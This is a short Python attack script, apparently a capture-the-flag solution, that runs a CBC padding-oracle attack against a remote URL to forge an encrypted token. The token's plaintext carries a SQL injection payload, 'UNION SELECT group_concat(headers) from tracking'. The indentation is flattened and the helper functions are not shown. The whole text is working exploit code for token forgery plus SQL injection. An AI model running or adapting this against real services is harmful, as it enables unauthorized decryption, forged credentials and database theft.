if __name__ == "__main__":
url = ‘http://35.227.24.107/ca0bd5fe49/’
post = ‘mG4BSyn6t1c4IgqhyHHcVRjnunFX2bbEm!RUKdd5t9YyhBXg8gT36-P7GTqP91bzQCRysh1k3UimfLeMV6Ii!AblJ5bXsFEZmzimZDQrMpkvlhOu4yTWsUde3925VnljzEhScEAYZOjzjLKiWv-nVlIdvaJzLVHsYkwSPHPx-H3zqlRFGTw9TQUOB37Dpkqsk0zYgPNgRWie72vAvfit9g~~’
ciphertext = decode(post)[16*6:16*7]
immediate = bxor(b’$FLAG$”, “id”: “‘, decode(post)[16*(1+4):16*(1+5)])

plains = ‘{“id”:”0 UNION SELECT group_concat(headers), \’\’ from tracking”,”key”:”Dynamic Enc Key”}’
data = pad(plains.encode(‘utf-8’), 16)
block_amount = int(len(data) / 16)
index = block_amount
while True:
block = data[(index-1)*16: index*16]
print(‘meow：’)
print(block)
iv = bxor(immediate, block)
ciphertext = iv + ciphertext
index -= 1
if index > 0:
immediate = padding_oracle_decrypt(url, iv)
else:
break
print(encode(ciphertext))
